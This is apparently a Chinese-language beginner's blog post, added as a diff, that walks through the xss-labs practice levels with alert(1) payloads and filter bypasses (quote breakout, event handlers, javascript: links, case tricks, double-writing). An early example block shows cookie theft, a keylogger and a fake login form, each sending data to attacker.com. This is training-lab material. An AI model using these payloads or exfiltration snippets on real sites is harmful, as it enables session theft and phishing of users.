@@ -1,0 +1,1398 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="John Doe">
+
+
+
+
+
+<title>XSS从入门到入土（xss-labs 1-16） | 菜菜のblog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
+
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saisi&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/category">Categories</a>
+                
+                <a class="menu-item" href="/tag">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saisi&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/category">Categories</a>
+                
+                <a class="menu-item" href="/tag">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">XSS从入门到入土（xss-labs 1-16）</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 29, 2026&nbsp;&nbsp;10:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/XSS/">XSS</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="XSS从入门到入土（xss-labs-1-16）"><a href="#XSS从入门到入土（xss-labs-1-16）" class="headerlink" title="XSS从入门到入土（xss-labs 1-16）"></a>XSS从入门到入土（xss-labs 1-16）</h1><h5 id="继续CTF学习之旅，这次来搞XSS！之前在sql注入里学到不少东西，现在转战XSS，一步一步分享学习过程和踩过的坑。真的非常基础，大佬请绕道（如果有人看的话）谢谢大家支持"><a href="#继续CTF学习之旅，这次来搞XSS！之前在sql注入里学到不少东西，现在转战XSS，一步一步分享学习过程和踩过的坑。真的非常基础，大佬请绕道（如果有人看的话）谢谢大家支持" class="headerlink" title="继续CTF学习之旅，这次来搞XSS！之前在sql注入里学到不少东西，现在转战XSS，一步一步分享学习过程和踩过的坑。真的非常基础，大佬请绕道（如果有人看的话）谢谢大家支持"></a>继续CTF学习之旅，这次来搞XSS！之前在sql注入里学到不少东西，现在转战XSS，一步一步分享学习过程和踩过的坑。真的非常基础，大佬请绕道（如果有人看的话）谢谢大家支持</h5><h2 id="一、XSS是什么？"><a href="#一、XSS是什么？" class="headerlink" title="一、XSS是什么？"></a>一、XSS是什么？</h2><p>XSS全称Cross-Site Scripting（跨站脚本攻击），是Web安全中最常见的漏洞之一。</p>
+<p><strong>一句话理解：</strong> 网站把用户输入的内容，没有做任何处理就直接放到了网页上显示。攻击者就可以输入恶意的JavaScript代码，让它在别人的浏览器里执行。</p>
+<p><strong>生活类比：</strong> 想象你家门口有个公告栏，任何人都可以贴纸条。如果有人贴了一张”请把钱包交给隔壁老王”的纸条，其他路过的人看到后照做了——这就是XSS，借助网站的”信任”，在别人的浏览器里执行你的代码。</p>
+<h3 id="XSS的三种类型"><a href="#XSS的三种类型" class="headerlink" title="XSS的三种类型"></a>XSS的三种类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>特点</th>
+<th>危害程度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>反射型（Reflected）</td>
+<td>代码在URL里，服务器”反射”回来，需要诱导用户点击</td>
+<td>⭐⭐</td>
+</tr>
+<tr>
+<td>存储型（Stored）</td>
+<td>代码被保存到数据库，所有访问者都会中招</td>
+<td>⭐⭐⭐⭐⭐</td>
+</tr>
+<tr>
+<td>DOM型（DOM-based）</td>
+<td>代码不经过服务器，纯前端JavaScript处理不当</td>
+<td>⭐⭐⭐</td>
+</tr>
+</tbody></table>
+<h3 id="能执行JavaScript意味着什么？"><a href="#能执行JavaScript意味着什么？" class="headerlink" title="能执行JavaScript意味着什么？"></a>能执行JavaScript意味着什么？</h3><p>很多人觉得弹个<code>alert(1)</code>没什么危害，但其实能执行JS代码的后果非常严重：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 偷Cookie</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://attacker.com/?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 键盘记录</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keypress&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://attacker.com/log?k=&#x27;</span>+e.<span class="property">key</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造登录框钓鱼</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span>=<span class="string">&#x27;&lt;form action=&quot;http://attacker.com/phish&quot;&gt;...&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们用<code>alert(1)</code>练习，只是为了证明漏洞存在而不造成实际伤害。</p>
+<hr>
+<h2 id="二、Level-1-——-最简单的XSS"><a href="#二、Level-1-——-最简单的XSS" class="headerlink" title="二、Level 1 —— 最简单的XSS"></a>二、Level 1 —— 最简单的XSS</h2><p>Level 1完全没有任何过滤，直接输入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>弹框成功，通关！</p>
+<h3 id="逐部分解析这行代码"><a href="#逐部分解析这行代码" class="headerlink" title="逐部分解析这行代码"></a>逐部分解析这行代码</h3><table>
+<thead>
+<tr>
+<th>部分</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;script&gt;</code></td>
+<td>告诉浏览器：”这里面是JS代码，请执行”</td>
+</tr>
+<tr>
+<td><code>alert(1)</code></td>
+<td>弹出一个写着”1”的警告框</td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td>JS语句结束符</td>
+</tr>
+<tr>
+<td><code>&lt;/script&gt;</code></td>
+<td>告诉浏览器：”代码到此结束”</td>
+</tr>
+</tbody></table>
+<p>浏览器读HTML时，遇到<code>&lt;script&gt;</code>标签就会把里面的内容当代码执行。Level 1服务器把用户输入原封不动放进HTML，所以我们直接注入成功。</p>
+<hr>
+<h2 id="三、Level-2-——-学会看源代码"><a href="#三、Level-2-——-学会看源代码" class="headerlink" title="三、Level 2 —— 学会看源代码"></a>三、Level 2 —— 学会看源代码</h2><p>Level 2输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>后，页面直接显示了我们的payload，没有弹框。</p>
+<h3 id="关键技能：查看网页源代码"><a href="#关键技能：查看网页源代码" class="headerlink" title="关键技能：查看网页源代码"></a>关键技能：查看网页源代码</h3><p>右键 → 查看页面源代码（或Ctrl+U &#x2F; F12），发现：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span> <span class="attr">value</span>=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>关键发现：</strong> <code>&lt;h2&gt;</code>里的内容被转义了（<code>&amp;lt;</code> <code>&amp;gt;</code>），但<code>&lt;input&gt;</code>的value里<strong>完全没有转义</strong>！</p>
+<h3 id="为什么没弹框？"><a href="#为什么没弹框？" class="headerlink" title="为什么没弹框？"></a>为什么没弹框？</h3><p>因为<code>&lt;script&gt;</code>标签在HTML属性值（<code>value=&quot;...&quot;</code>）里面是不会执行的！</p>
+<h3 id="解法：闭合引号逃出去"><a href="#解法：闭合引号逃出去" class="headerlink" title="解法：闭合引号逃出去"></a>解法：闭合引号逃出去</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注入后：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br><span class="line">                         ↑闭合value  ↑代码跑到标签外面了！会执行！</span><br></pre></td></tr></table></figure>
+
+<p><strong>理解过程：</strong> 就像SQL注入一样，先用<code>&quot;</code>闭合value属性，再用<code>&gt;</code>关闭input标签，然后我们的script标签就变成了独立的HTML元素，可以正常执行了。末尾多出来的<code>&quot;&gt;</code>不影响攻击成功，浏览器容错能力很强。</p>
+<hr>
+<h2 id="四、Level-3-——-引号过滤"><a href="#四、Level-3-——-引号过滤" class="headerlink" title="四、Level 3 —— 引号过滤"></a>四、Level 3 —— 引号过滤</h2><p>Level 3的过滤更强了：</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>处理结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;</code></td>
+<td>转义为<code>&amp;lt;</code></td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td>转义为<code>&amp;gt;</code></td>
+</tr>
+<tr>
+<td><code>&quot;</code>（双引号）</td>
+<td>替换为<code>&#39;</code>（单引号）</td>
+</tr>
+<tr>
+<td><code>&#39;</code>（单引号）</td>
+<td><strong>没有过滤！</strong></td>
+</tr>
+</tbody></table>
+<p>而且value属性用的是单引号：<code>value=&#39;...&#39;</code></p>
+<h3 id="解法：用单引号闭合-事件属性绕过"><a href="#解法：用单引号闭合-事件属性绕过" class="headerlink" title="解法：用单引号闭合 + 事件属性绕过"></a>解法：用单引号闭合 + 事件属性绕过</h3><p>既然<code>&lt;</code>和<code>&gt;</code>都被过滤了，<code>&lt;script&gt;</code>标签用不了。但我们可以用HTML的<strong>事件属性</strong>！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onmouseover=&#x27;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>注入后：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>是一个事件属性，意思是”当鼠标移到元素上时执行代码”。把鼠标移到输入框上就会弹框！</p>
+<h3 id="学到的事件属性"><a href="#学到的事件属性" class="headerlink" title="学到的事件属性"></a>学到的事件属性</h3><table>
+<thead>
+<tr>
+<th>事件</th>
+<th>触发条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>onmouseover</code></td>
+<td>鼠标移到元素上</td>
+</tr>
+<tr>
+<td><code>onfocus</code></td>
+<td>元素获得焦点</td>
+</tr>
+<tr>
+<td><code>onclick</code></td>
+<td>点击元素</td>
+</tr>
+<tr>
+<td><code>onerror</code></td>
+<td>图片加载失败</td>
+</tr>
+<tr>
+<td><code>onload</code></td>
+<td>元素加载完成</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="五、Level-4-——-直接删除"><a href="#五、Level-4-——-直接删除" class="headerlink" title="五、Level 4 —— 直接删除"></a>五、Level 4 —— 直接删除</h2><p>Level 4的过滤方式和Level 3不同：</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>Level 3</th>
+<th>Level 4</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;</code></td>
+<td>转义为<code>&amp;lt;</code></td>
+<td><strong>直接删除</strong></td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td>转义为<code>&amp;gt;</code></td>
+<td><strong>直接删除</strong></td>
+</tr>
+</tbody></table>
+<p>输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>变成<code>scriptalert(1)/script</code>，尖括号被直接吃掉了。</p>
+<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>思路和Level 3一样，用事件属性绕过（不需要尖括号）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>或者更规范的写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>注入后：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、Level-5-——-关键词过滤与javascript伪协议"><a href="#六、Level-5-——-关键词过滤与javascript伪协议" class="headerlink" title="六、Level 5 —— 关键词过滤与javascript伪协议"></a>六、Level 5 —— 关键词过滤与javascript伪协议</h2><p>Level 5过滤更狠了：</p>
+<table>
+<thead>
+<tr>
+<th>关键词</th>
+<th>处理结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>script</code></td>
+<td>→ <code>scr_ipt</code></td>
+</tr>
+<tr>
+<td><code>on</code></td>
+<td>→ <code>o_n</code>（所有事件处理器全废！）</td>
+</tr>
+</tbody></table>
+<p>这意味着：</p>
+<ul>
+<li><code>&lt;script&gt;</code> → <code>&lt;scr_ipt&gt;</code> ❌</li>
+<li><code>onerror</code> → <code>o_nerror</code> ❌</li>
+<li><code>onmouseover</code> → <code>o_nmouseover</code> ❌</li>
+<li>所有on开头的属性全部失效！</li>
+</ul>
+<h3 id="解法：javascript-伪协议"><a href="#解法：javascript-伪协议" class="headerlink" title="解法：javascript: 伪协议"></a>解法：javascript: 伪协议</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>hack<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><code>href</code>不只是能放URL！</strong> 它支持URI（URL的超集），其中包括：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://...    → 打开网页</span><br><span class="line">mailto:...     → 打开邮箱</span><br><span class="line">javascript:... → 执行JavaScript代码！</span><br></pre></td></tr></table></figure>
+
+<p>所以<code>&lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</code>的意思是：创建一个写着”hack”的链接，<strong>点击它</strong>就会执行alert(1)。</p>
+<p>注入后页面会出现一个”hack”链接，点击即弹框。</p>
+<hr>
+<h2 id="七、Level-6-——-大小写绕过"><a href="#七、Level-6-——-大小写绕过" class="headerlink" title="七、Level 6 —— 大小写绕过"></a>七、Level 6 —— 大小写绕过</h2><p>Level 6在Level 5的基础上，又多过滤了一个词：</p>
+<table>
+<thead>
+<tr>
+<th>关键词</th>
+<th>处理结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>script</code></td>
+<td>→ <code>scr_ipt</code></td>
+</tr>
+<tr>
+<td><code>on</code></td>
+<td>→ <code>o_n</code></td>
+</tr>
+<tr>
+<td><code>href</code></td>
+<td>→ <code>hr_ef</code>（新增！）</td>
+</tr>
+</tbody></table>
+<p>上一题的<code>&lt;a href=javascript:alert(1)&gt;</code>用不了了，因为<code>href</code>也被过滤了。</p>
+<h3 id="关键发现：过滤是区分大小写的！"><a href="#关键发现：过滤是区分大小写的！" class="headerlink" title="关键发现：过滤是区分大小写的！"></a>关键发现：过滤是区分大小写的！</h3><p>Level 6的过滤程序只匹配<strong>小写</strong>的关键词，但<strong>HTML不区分大小写</strong>！</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这些在HTML里是完全等价的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">   ✅</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-handlebars"><span class="language-xml">   ✅</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span>   ✅</span></span></span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="解法一：大小写绕过href"><a href="#解法一：大小写绕过href" class="headerlink" title="解法一：大小写绕过href"></a>解法一：大小写绕过href</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hREF=javascript:alert(1)&gt;hack&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>hREF</code>不等于<code>href</code>（大小写不同），过滤器不认识它，但浏览器认识！</p>
+<h3 id="解法二：大小写绕过script"><a href="#解法二：大小写绕过script" class="headerlink" title="解法二：大小写绕过script"></a>解法二：大小写绕过script</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scRipt&gt;alert(1)&lt;/scRipt&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>scRipt</code>不等于<code>script</code>，过滤器跳过，浏览器照样执行！</p>
+<h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><p>我一开始尝试<code>&lt;scRipt&gt;alert(1)&lt;/scRipt&gt;</code>但没有弹框，原因是<strong>忘记闭合前面的value属性了</strong>！</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 错误：还在value里面，不会执行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&lt;scRipt&gt;alert(1)&lt;/scRipt&gt;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 正确：用&quot;&gt;逃出来后，才能执行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">scRipt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scRipt</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>教训：不管用什么payload，永远记得先闭合逃出来！</strong></p>
+<hr>
+<h2 id="八、Level-7-——-双写绕过"><a href="#八、Level-7-——-双写绕过" class="headerlink" title="八、Level 7 —— 双写绕过"></a>八、Level 7 —— 双写绕过</h2><p>Level 7的过滤方式是<strong>直接删除</strong>关键词，但<strong>只删一次</strong>！</p>
+<h3 id="双写绕过原理"><a href="#双写绕过原理" class="headerlink" title="双写绕过原理"></a>双写绕过原理</h3><p>当过滤器删除 <code>script</code> 时，如果我们写两个嵌套的 <code>script</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：  scscriptript</span><br><span class="line">过滤：  sc[script]ript  ← 删掉中间的 script</span><br><span class="line">结果：  script          ← 又变回 script 了！🎉</span><br></pre></td></tr></table></figure>
+
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注入后服务器过滤一次：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>完美恢复成 <code>&lt;script&gt;</code> 标签，弹框成功！</p>
+<h3 id="对比不同过滤方式的绕过策略"><a href="#对比不同过滤方式的绕过策略" class="headerlink" title="对比不同过滤方式的绕过策略"></a>对比不同过滤方式的绕过策略</h3><table>
+<thead>
+<tr>
+<th>过滤方式</th>
+<th>示例</th>
+<th>能否双写绕过？</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>插入字符</td>
+<td><code>script</code> → <code>scr_ipt</code></td>
+<td>❌ 会留下 <code>_</code></td>
+</tr>
+<tr>
+<td>删除（循环删）</td>
+<td>删到没有为止</td>
+<td>❌ 双写也会被删</td>
+</tr>
+<tr>
+<td><strong>删除（只删一次）</strong></td>
+<td><code>script</code> → 删掉</td>
+<td>✅ <strong>双写绕过！</strong></td>
+</tr>
+</tbody></table>
+<p><strong>关键判断：</strong> 先测试过滤器是”只删一次”还是”循环删除”，再决定能不能用双写。</p>
+<hr>
+<h2 id="九、Level-8-——-HTML-实体编码绕过"><a href="#九、Level-8-——-HTML-实体编码绕过" class="headerlink" title="九、Level 8 —— HTML 实体编码绕过"></a>九、Level 8 —— HTML 实体编码绕过</h2><h3 id="新的注入点"><a href="#新的注入点" class="headerlink" title="新的注入点"></a>新的注入点</h3><p>从 Level 8 开始，搜索框的 <code>value</code> 属性使用了 <code>htmlspecialchars()</code> 函数进行严格转义，完全封死了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>)</span><br><span class="line"><span class="comment">// &lt; &gt; &quot; &#x27; &amp; → &amp;lt; &amp;gt; &amp;quot; &amp;#039; &amp;amp;</span></span><br></pre></td></tr></table></figure>
+
+<p>但题目提供了另一个注入点：<strong>友情链接的 <code>&lt;a&gt;</code> 标签 href 属性</strong>。</p>
+<h3 id="过滤规则"><a href="#过滤规则" class="headerlink" title="过滤规则"></a>过滤规则</h3><p>测试发现以下关键词都被过滤：</p>
+<table>
+<thead>
+<tr>
+<th>关键词</th>
+<th>处理结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>javascript</code></td>
+<td>→ <code>javascr_ipt</code></td>
+</tr>
+<tr>
+<td><code>script</code></td>
+<td>被过滤</td>
+</tr>
+<tr>
+<td><code>src</code></td>
+<td>被过滤</td>
+</tr>
+<tr>
+<td><code>data</code></td>
+<td>被过滤</td>
+</tr>
+<tr>
+<td><code>onfocus</code></td>
+<td>被过滤</td>
+</tr>
+<tr>
+<td><code>href</code></td>
+<td>被过滤</td>
+</tr>
+<tr>
+<td><code>&quot;</code> (双引号)</td>
+<td>被过滤</td>
+</tr>
+</tbody></table>
